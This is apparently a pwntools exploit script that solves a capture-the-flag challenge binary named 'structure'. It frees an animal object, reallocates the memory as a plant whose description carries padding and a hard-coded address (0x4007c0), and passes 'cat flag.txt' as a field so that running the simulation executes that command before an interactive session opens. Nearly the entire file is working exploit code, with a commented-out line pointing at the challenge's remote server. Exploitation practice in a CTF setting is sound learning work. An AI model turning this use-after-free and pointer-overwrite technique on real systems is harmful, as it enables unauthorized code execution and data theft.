#!/usr/bin/python3

from pwn import *

target = './structure'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================

def new_anim(name, spec):
    p.recvuntil('Simulation')
    p.sendline('1')
    p.recvuntil('this?')
    p.sendline(spec)
    p.recvuntil('name?')
    p.sendline(name)

def new_plant(kind, desc):
    p.recvuntil('Simulation')
    p.sendline('2')
    p.recvuntil('this')
    p.sendline(kind)
    p.recvuntil('plant')
    p.sendline(desc)

def remove(rid):
    p.recvuntil('Simulation')
    p.sendline('4')
    p.recvuntil('remove?')
    p.sendline(rid)

def run_sim():
    p.recvuntil('Simulation')
    p.sendline('3')

#==========================================================
#           CODE
#==========================================================

p = process(target)#, env={"LD_PRELOAD":"libc.so.6"})
#p = remote('challenge.acictf.com',60151)

#gdb.attach(p)

pl = b'\x42' * 48
pl += b'\x43' * 4
pl += p64(0x4007c0)

new_anim('georgie', 'dog')
remove('0')

new_plant('cat flag.txt',pl)

run_sim()

p.interactive()
